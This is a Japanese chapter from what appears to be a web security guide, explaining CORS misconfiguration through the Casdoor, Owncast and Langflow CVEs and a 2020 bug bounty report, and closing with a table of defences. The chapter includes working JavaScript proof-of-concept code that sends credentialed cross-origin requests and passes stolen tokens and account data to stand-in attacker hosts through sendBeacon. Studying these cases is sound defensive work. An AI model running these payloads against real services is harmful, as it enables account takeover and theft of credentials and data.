このとき、ブラウザの仕様上 ACAO に**ワイルドカード `*` は使えない**（`*` + credentials は禁止で、ブラウザがレスポンスをブロックする）。そのため攻撃者は「サーバがOriginを検証しきれず、攻撃者オリジンを**具体的な文字列として反射／許可**してしまう」設定ミスを狙う。以下の事例は、すべてこの「Origin検証の甘さ」が核心にある。

---

### 事例1: Casdoor — beego CorsFilter の「プレフィックス一致」バイパス（CVE-2024-41657 / GHSL-2024-035）

Casdoorは、SSO・OAuth・多要素認証などを提供するオープンソースのアイデンティティ基盤（IdP）である。IdPは全アプリのログイン状態を束ねる中枢であり、そこでCORSが破れると被害範囲は連結アプリ全体に及ぶ。

- 影響バージョン: **v1.577.0 以前**
- 修正バージョン: **v1.578.0**
- CVSS: **8.8（High）**（※GitHub Advisory等が採用。一部データベースはCVSS 3.1で8.1と記載）
- 発見: GitHub Security Lab、CodeQLの「CORS Misconfiguration Query」による検出

#### 何が起きたか — sink（危険な代入先）としてのORIGIN検証

問題は `routers/cors_filter.go` の `CorsFilter` にあった。許可オリジンの判定が、次のように**プレフィックス（前方）一致**と部分一致だけで行われていた。

```go
if strings.HasPrefix(origin, "http://localhost") ||
   strings.HasPrefix(origin, "https://localhost") ||
   strings.HasPrefix(origin, "http://127.0.0.1") ||
   strings.HasPrefix(origin, "http://casdoor-app") ||
   strings.Contains(origin, ".chromiumapp.org") {
    // このオリジンを信頼して ACAO に反射し、ACAC:true を付与する
}
```

ここで `origin` は攻撃者が自由に設定できる `Origin` リクエストヘッダの値である。開発者の意図は「localhost での開発や、ブラウザ拡張（`*.chromiumapp.org`）からのアクセスを許したい」というものだった。しかし `strings.HasPrefix(origin, "http://localhost")` は、文字列が `http://localhost` **で始まりさえすれば** true を返す。

#### なぜバイパスできるのか — URLの権威部（authority）の構造

原理を理解する鍵は、URLの `scheme://host` という構造にある。`http://localhost.example.com` というオリジンを考えると、これは**「`localhost.example.com` というホスト名」を持つ、攻撃者所有のドメイン**である（DNSで `localhost.example.com` を自分のサーバに向ければよい）。ところが文字列としては先頭が `http://localhost` なので、`HasPrefix` は true を返してしまう。

```text
Origin: http://localhost.evil.com   → HasPrefix(origin, "http://localhost") == true  ← 攻撃者ドメインなのに許可
Origin: http://127.0.0.1.evil.com   → HasPrefix(origin, "http://127.0.0.1") == true  ← 同上
```

`.chromiumapp.org` の `strings.Contains` も同様に危うい。`http://evil.com/#.chromiumapp.org` や `http://x.chromiumapp.org.evil.com` のような、`.chromiumapp.org` を**部分文字列として含むだけ**の攻撃者オリジンが通り抜ける。

このように、Origin検証を「文字列の前方一致・部分一致」で書くと、**ホスト名の右端（登録可能ドメインの境界）を無視する**ため、攻撃者は許可プレフィックスを自分のサブドメインラベルとして先頭に埋め込むだけでバイパスできる。GitHub Security Labの表現を借りれば「有効なプレフィックスを持つ有効なサブドメインは誰でも作れる（例: `localhost.example.com`）」。

#### 影響と修正

バイパスが成立すると、攻撃者ページはログイン中の被害者の資格情報付きでCasdoor APIを叩き、そのレスポンスを読めるため、ユーザー情報の窃取や設定改ざんによるアカウント乗っ取りに至る。修正版（v1.578.0）では、前方一致ではなく**許可リストとの厳密一致（完全一致 or 正規のサブドメイン境界チェック）**へ改められた。

同アドバイザリではもう1件、`QrCodePage.js` のWechatPayフロー由来の**反射型XSS（CVE-2024-41658 / GHSL-2024-036）**も報告されている。クエリ由来の `successUrl` を無検証で `Setting.goToLink(this.state.successUrl)` に渡していたもので、`javascript:` スキーム等の注入でアカウント乗っ取りに繋がりうる。CORSの話題からは外れるが、同じ「入力を検証せずにsinkへ流す」パターンである点を押さえておきたい。

> 出典: GHSL-2024-035_GHSL-2024-036: CORS misconfiguration and Reflected XSS in Casdoor — https://securitylab.github.com/advisories/GHSL-2024-035_GHSL-2024-036_casdoor/

---

### 事例2: Owncast — 管理APIでのOrigin反射＋ACAC:true（CVE-2024-29026）

Owncastは、自前ホスト型のライブ配信・チャットサーバである。ここでの問題は、**管理API（`/api/admin/*`）**でCORSが全開になっていたことだ。管理APIは最も守られるべき面であり、そこがCORSで露出した意味は大きい。

- 影響バージョン: **0.1.2 以前**
- 修正バージョン: **0.1.3**（修正コミット `9215d9ba0f29d62201d3feea9e77dcd274581624`、2023-12-18）
- CVSS: **8.2（High、CVSS 3.1）**（※一部データベースはCSRFとして分類し9.1と記載）

#### 何が起きたか — 「Origin丸ごと反射」という最悪パターン

`router/middleware/auth.go`（32行目付近）で、レスポンスヘッダが次のように組み立てられていた。

```go
w.Header().Set("Access-Control-Allow-Origin", r.Header.Get("Origin"))
w.Header().Set("Access-Control-Allow-Credentials", "true")
w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization")
```

1行目が致命的だ。`r.Header.Get("Origin")`（＝攻撃者が任意に設定できるOriginヘッダ）を**一切検証せずそのまま**ACAOに書き戻している。しかも2行目で ACAC:true が付く。前述の成立条件（ACAOが攻撃者オリジンを許可 ＋ ACAC:true）が、**どんなオリジンに対しても無条件に満たされてしまう**。

これは「Origin反射（Origin reflection）」と呼ばれる典型的アンチパターンで、`*` を避けつつ実質的に「全オリジン許可＋credentials可」を作り出す、最も危険なCORS設定ミスである。

#### PoC — 管理者パスワードを盗む

攻撃者は次のようなHTMLを被害管理者に踏ませるだけでよい。

```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        alert(xhr.responseText);   // 実際は attacker.com へ送信する
    }
}
xhr.open('GET', 'http://owncast.domain/api/admin/serverconfig', true);
xhr.withCredentials = true;   // ← 被害者のCookie/認証情報を同送させる肝
xhr.send(null);
```

`xhr.withCredentials = true` が肝である。これにより、Owncastへのリクエストに**被害管理者のセッションCookie（や保存済みBasic認証）が自動付与**される。サーバはそのセッションを正規と認め、`serverconfig`（管理サーバ設定）を返す。応答ヘッダにはOrigin反射されたACAO＋ACAC:trueが付いているため、**攻撃者オリジンのJavaScriptがレスポンス本文を読める**。`serverconfig` には管理者パスワード（ハッシュ or ストリームキー等の機微情報）が含まれ、これを盗めば完全な管理権限奪取（ATO）となる。

#### なぜ withCredentials とプリフライトを越えられるのか

`GET /api/admin/serverconfig` は「単純リクエスト（simple request）」に近く、カスタムヘッダを足さなければ**プリフライト（OPTIONS事前確認）を経ずに本要求が飛ぶ**か、飛んでもサーバが全許可を返すため通る。ブラウザは「レスポンスを読ませてよいか」をACAO/ACACで最終判定するが、その両方が攻撃者に有利に揃っているため、読み取りブロックが働かない。修正では**CORS許可をlocalhostのみに制限**し、任意オリジンの反射をやめた。

> 出典: GHSL-2023-261: CORS misconfiguration in Owncast — https://securitylab.github.com/advisories/GHSL-2023-261_Owncast/

---

### 事例3: Langflow — CORS全開×リフレッシュトークン×SameSite=None が RCE まで連鎖（CVE-2025-34291）

Langflowは、LLMエージェント／ワークフローを組むビジュアル基盤である。この事例は、CORS単体ではなく**「CORS設定ミス」「クロスサイト配送されるリフレッシュトークンCookie」「トークン更新エンドポイントのCSRF欠如」**が連鎖して、ワンクリックでのアカウント乗っ取り→RCEに至った点で示唆に富む。しかもCISA/VulnCheckのKEV（Known Exploited Vulnerabilities、実際に悪用が観測された脆弱性）に登録された、実害を伴う事例である。

> ⚠️ **未取得の資料**: 指定URLの「GitLab Advisory Database（Langflow CVE-2025-34291）」は自動取得できませんでした（理由: WebFetchが当該ページのJavaScript描画コンテンツを取得できず本文が空扱いとなったため）。以下のURLからご自身で直接ご覧ください: https://advisories.gitlab.com/pkg/pypi/langflow/CVE-2025-34291/
> 以下の技術内容は、同一CVEを扱う一次情報のVulnCheckアドバイザリおよびObsidian Security解説から抽出したものです（下記出典参照）。

- 影響バージョン: **1.6.9 以前**（デフォルト構成が脆弱）
- 修正バージョン: **1.7.0**
- CVSS: **9.4（Critical、CVSS v4.0）**／ベクタ `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H`
- CWE: **CWE-346（Origin Validation Error）**
- KEV: **VulnCheck KEV に登録（実世界での悪用が観測）**

#### 連鎖の全体像

Langflowのデフォルト構成は、概念的には次のようなCORSミドルウェア（FastAPI/Starlette）を持っていた。

```python
# 危険な組み合わせ（概念コード）
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],      # 全オリジン許可
    allow_credentials=True,   # かつ credentials も許可
    allow_methods=["*"],
    allow_headers=["*"],
)
```

`allow_origins=["*"]` と `allow_credentials=True` の同時指定は、仕様上は矛盾（`*`+credentialsはブラウザがブロック）だが、多くのフレームワークはこの指定を受けると**リクエストのOriginを反射する形で実質的に全許可**として振る舞う。結果、事例2と同じ「任意オリジン許可＋ACAC:true」の状態になる。

もう一方の要因が、リフレッシュトークンCookieの属性である。

```text
Set-Cookie: refresh_token_lf=<...>; HttpOnly; SameSite=None; Secure
```

`SameSite=None` は、そのCookieを**クロスサイト（第三者サイト起点）のリクエストにも自動付与する**設定である。攻撃者ページからLangflowのトークン更新エンドポイント（`/api/v1/refresh` 相当）へ `fetch(..., {credentials:'include'})` すると、被害者の `refresh_token` が同送され、サーバは**新鮮な access_token / refresh_token ペアを発行**する。CORSが実質全開なので、攻撃者JSはその応答（新トークン）を読み取れる。加えて更新エンドポイントにCSRF対策（トークン確認等）が無いため、この一連が成立する。

```javascript
// 概念PoC: 被害者がページを開くだけでトークンを奪取
fetch("https://victim-langflow.example/api/v1/refresh", {
  method: "POST",
  credentials: "include"   // SameSite=None の refresh_token が同送される
})
.then(r => r.json())
.then(tok => {
  // ACAO反射＋ACAC:true なのでレスポンス(=新トークン)が読める
  navigator.sendBeacon("https://attacker.example/steal", JSON.stringify(tok));
});
```

#### なぜ RCE まで行くのか

奪ったトークンで攻撃者は被害者として認証済みAPIを叩ける。Langflowには**コード実行機能（ワークフロー内でPython等を評価する組み込み機能）**があり、認証済みなら到達できる。したがって「CORS設定ミス → トークン窃取（ATO） → 認証済みコード実行エンドポイント → RCE → 完全なシステム侵害」という連鎖が完成する。さらにLangflow環境にはOpenAI/AnthropicのAPIキー、DB接続文字列、ベクタストア資格情報、Webhookシークレット等が保存されているのが常であり、二次被害（連携先サービスの資格情報流出）も甚大である。

この事例の教訓は明確だ。**CORSは認証・Cookie属性・CSRF対策と一体で設計しなければならない**。`allow_credentials=True` を使うなら `allow_origins` は厳密な許可リストにし、認証トークンCookieは可能な限り `SameSite=Lax`/`Strict` にし、状態変更・トークン更新エンドポイントにはCSRF対策を併設する——このどれか一つでも成立していれば、連鎖は途中で断ち切れた。

> 出典: Langflow <= 1.6.9 CORS Misconfiguration to Token Hijack & RCE (CVE-2025-34291) — VulnCheck — https://www.vulncheck.com/advisories/langflow-cors-misconfiguration-to-token-hijack-and-rce
> 出典: CVE-2025-34291 Critical Account Takeover and RCE in Langflow — Obsidian Security — https://www.obsidiansecurity.com/blog/cve-2025-34291-critical-account-takeover-and-rce-vulnerability-in-the-langflow-ai-agent-workflow-platform
> 出典: GitLab Advisory Database — Langflow CVE-2025-34291（未取得） — https://advisories.gitlab.com/pkg/pypi/langflow/CVE-2025-34291/

---

### 事例4: バグバウンティ実戦記 — CORSによるATO＋機密データ窃取（Lütfü Mert Ceylan, 2020）

最後は、CVE化されていない実サービスでのバグバウンティ事例。研究者 Lütfü Mert Ceylan 氏が2020年6月に報告し、報奨金を得たもの。CVEやOSSコードの外で、**現場でどう見つけ・どう再現し・報告したか**の一次記録として価値がある。

> ⚠️ **注記**: 本節は防御・検出手法の理解を目的とする。ここに書かれた手順は**あくまで研究者本人が正規の許可（バグバウンティ）の下で自身の検証環境／許諾範囲に対して行ったもの**であり、無許可の実在サービスや本番環境に対して同種の検証を行ってはならない。

#### 発見 — Originを差し替えて反射を観測する

CORS設定ミスの検出は極めて単純だ。任意のリクエストの `Origin` ヘッダを攻撃者オリジンに差し替え、レスポンスの ACAO/ACAC を観察する。

```http
GET /api/account HTTP/1.1
Host: target.example
Origin: https://evil.com
Cookie: session=<被害者相当のセッション>
```

に対し、サーバが次を返した。

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com      ← Originをそのまま反射
Access-Control-Allow-Credentials: true             ← credentials も許可
```

任意の `Origin`（`evil.com`）が ACAO に反射され、かつ ACAC:true が付く——事例2・3と同じ「Origin反射型」の全開設定である。この時点で「credentials付きクロスオリジン読み取りが可能」と確定する。

#### 悪用 — PUT一発でメール変更＋全データJSON窃取

このサービスでは、アカウント情報更新（メールアドレス変更）が `PUT` で行え、**そのレスポンスにアカウントの全データがJSONで返る**設計だった。研究者は、被害者にページを踏ませるだけで動くスクリプトを作成した（概念再構成）。

```javascript
var req = new XMLHttpRequest();
req.open("PUT", "https://target.example/api/account", true);
req.withCredentials = true;                         // 被害者のセッションを同送
req.setRequestHeader("Content-Type", "application/json");
req.onload = function () {
    // ACAO反射＋ACAC:true のため、応答(=全アカウントデータ)を読める
    navigator.sendBeacon("https://attacker-requestbin.example/collect", req.responseText);
};
// メールを攻撃者のものに書き換える → 以後パスワードリセットで完全奪取
req.send(JSON.stringify({ email: "attacker@evil.com" }));
```

このスクリプトは2つの攻撃を同時に成立させる。

1. **アカウント乗っ取り（ATO）**: `email` を攻撃者アドレスに書き換える。以後、攻撃者は「パスワードを忘れた」フローで自分のメールにリセットリンクを受け取り、被害者アカウントを完全掌握する。
2. **機密データ窃取**: 同じPUTのレスポンスに返る全アカウントデータJSONを、ACAO/ACACが揃っているため攻撃者JSが読み取り、requestbin等の攻撃者管理エンドポイントへ送信する。

#### なぜ PUT が通ってしまうのか — プリフライトの誤解

`PUT` かつ `Content-Type: application/json` は「単純リクエスト」ではないため、ブラウザは事前に `OPTIONS`（プリフライト）を送り、サーバの `Access-Control-Allow-Methods`／`Access-Control-Allow-Headers`／ACAO／ACAC を確認する。ここで「プリフライトがあるから安全」と考えるのは誤りだ。**サーバがプリフライトにも全許可（任意Origin反射＋ACAC:true＋PUT許可＋Content-Type許可）を返せば、ブラウザは本要求を送出し、レスポンス読み取りも許す**。CORSはあくまで「サーバが許可したか」を仲介するだけで、サーバ側の許可が甘ければ何の防壁にもならない。

- タイムライン: 2020-06-10 報告・確認、2020-06-11 報奨金授与

> 出典: ATO and Data Leakage via CORS Misconfiguration — Lütfü Mert Ceylan — https://lutfumertceylan.com.tr/posts/ato-and-data-leakage-via-cors-misc/

---

### この節のまとめ — 4事例から抽出できる防御原則

4件に共通する根本原因は、**「Originを厳密な許可リストと完全一致で照合していない」**ことに尽きる。危険パターンと対策を対比して締めくくる。

| 危険パターン | 具体例（本節） | 防御 |
| --- | --- | --- |
| プレフィックス／部分文字列一致でOrigin検証 | Casdoor `HasPrefix`／`Contains` | 完全一致の許可リスト。サブドメイン許可はホスト境界（右端ラベル）を厳密に確認 |
| Originヘッダを無検証で反射 | Owncast、実戦記 | 反射しない。許可リストに含まれるときだけ、その正規化済み値を返す |
| `allow_origins=*` と `allow_credentials=true` の併用 | Langflow | credentials可なら `*` は使わない。許可オリジンを明示列挙 |
| CORSを認証・Cookie・CSRFと切り離して設計 | Langflow連鎖 | 認証トークンCookieは `SameSite=Lax/Strict`、状態変更・トークン更新にCSRF対策 |
| 管理API・トークン更新など高権限面をCORSで露出 | Owncast `/api/admin/*`、Langflow `/refresh` | 高権限エンドポイントは同一オリジン限定（CORS許可を出さない） |

CORSの設定ミスは「読めるだけ」では終わらない。認証済みセッション、状態変更API、クロスサイト配送されるCookie、CSRF欠如が揃えば、**情報漏洩→アカウント乗っ取り→コード実行**へと一直線に連鎖する。CORSは単独の機能ではなく、認証・セッション・CSRF対策と一体の**信頼境界（trust boundary）の設計問題**として扱うべきである。


---

## ナビゲーション

[← 第9章 ツールと方法論](09-tooling.md)　｜　[📚 目次（ホーム）](index.md)　｜　[第11章 発展・方法論・防御の理解 →](11-methodology-defense.md)
